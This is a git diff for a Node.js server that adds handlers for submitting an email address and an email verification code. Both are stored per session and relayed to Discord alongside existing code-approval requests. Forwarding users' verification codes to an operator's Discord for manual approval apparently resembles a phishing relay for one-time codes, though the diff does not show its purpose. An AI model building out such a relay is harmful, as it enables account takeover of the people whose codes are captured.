@@ -3,13 +3,15 @@ import http from "node:http";
 import fs from "node:fs";
 import path from "node:path";
 import { fileURLToPath } from "node:url";
-import { processRequest, processVerify, processResend, validatePayload } from "./lib/handle-submit.js";
-import { createSession, getSessionStatus, submitCode, requestResendCode } from "./lib/session-store.js";
+import { processRequest, processVerify, processResend, processEmail, processVerifyEmail, validatePayload } from "./lib/handle-submit.js";
+import { createSession, getSessionStatus, submitCode, requestResendCode, submitEmail, submitEmailCode } from "./lib/session-store.js";
 import { getSiteMode } from "./lib/site-mode.js";
 import {
   sendApprovalRequest,
   sendCodeVerificationRequest,
   sendResendApprovalRequest,
+  sendEmailSubmission,
+  sendEmailCodeVerificationRequest,
 } from "./lib/discord.js";
 import { handleDiscordInteraction } from "./lib/discord-interaction.js";
 
@@ -92,6 +94,24 @@ const server = http.createServer(async (req, res) => {
         const result = await processVerify(payload, {
           submitCode,
           sendCodeVerificationRequest,
+        });
+        sendJson(res, 200, result);
+        return;
+      }
+
+      if (payload.type === "email") {
+        const result = await processEmail(payload, {
+          submitEmail,
+          sendEmailSubmission,
+        });
+        sendJson(res, 200, result);
+        return;
+      }
+
+      if (payload.type === "verify_email") {
+        const result = await processVerifyEmail(payload, {
+          submitEmailCode,
+          sendEmailCodeVerificationRequest,
         });
         sendJson(res, 200, result);
         return;
